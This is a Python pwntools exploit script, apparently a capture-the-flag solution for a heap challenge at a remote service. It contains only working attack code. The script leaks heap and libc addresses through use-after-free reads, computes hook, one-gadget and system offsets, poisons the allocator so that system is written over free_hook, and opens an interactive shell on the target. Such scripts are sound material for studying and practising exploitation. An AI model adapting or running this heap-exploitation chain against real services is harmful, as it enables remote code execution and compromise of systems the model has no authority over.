#-*- coding: utf-8 -*-
from pwn import *

conn = remote("cppp.pwni.ng", 7777)

def Add(name, buf):
	conn.recvuntil("Choice: ")
	conn.sendline("1")
	conn.recvuntil("name: ")
	conn.sendline(name)
	
	conn.recvuntil("buf: ")
	conn.sendline(buf)
	
	#conn.recvuntil("Done!")

def Remove(idx):
	conn.recvuntil("Choice: ")
	conn.sendline("2")
	conn.recvuntil("idx: ")
	conn.sendline(str(idx))

def View(idx):
	conn.recvuntil("Choice: ")
	conn.sendline("3")
	conn.recvuntil("idx: ")
	conn.sendline(str(idx))

def View_Name():
	conn.recvuntil("Choice: ")
	conn.sendline("3")
	

Add("A"*0x30, "buf_first")

for i in range(1,5):
	Add("text"+str(i), "buf"+str(i))
View(0)

Remove(1)
Remove(2)
Remove(3)
Remove(4)

Add("test1","okok1")

Remove(0)
#context.log_level = 'debug'
View(1)

leak = u64(conn.recv(6).ljust(8, "\x00"))
heap_base = leak - 0x134a0
log.info("leak : "+hex(leak))
log.info("heap_base : " + hex(heap_base))

############################################

Add("A"*0x30,p64(heap_base))

Add("leak", "A"*0x420)
Add("test1", "B"*10)

Add("test2", "B"*10)
Add("test2", "B"*10)

Remove(3)
Add("test", "B"*0x450)
Remove(3)


#context.log_level = 'debug'
View(6)

## libc_address
leak = u64(conn.recv(6).ljust(8, "\x00"))
libc_base = leak - 0x789ca0
log.info("libc_base : "+hex(libc_base))

malloc_hook = libc_base + 0x789c30
log.info("malloc_hook : "+hex(malloc_hook))

free_hook = libc_base + 0x78b8e8
log.info("free_hook : "+hex(free_hook))

one_shot = libc_base + 0x4f2c5# 0x4f322 0x10a38c
log.info("one_shot : "+hex(one_shot))

system_pp = libc_base+0x3ed440
log.info("system_pp : "+hex(system_pp))


Add("onlyADD1", "C"*0x30)
Remove(3)
Remove(3)
Remove(3)
Add("onlyADD2", "C"*0x70)
Add("onlyADD3", "C"*0x70)
Add("onlyADD4", "C"*0x70)
Add("onlyADD5", "C"*0x70)
Add("onlyADD6", "C"*0x70)
Add("onlyADD6", "C"*0x70)
Add("onlyADD6", p64(free_hook))
Add(p64(system_pp), p64(system_pp))

conn.interactive()

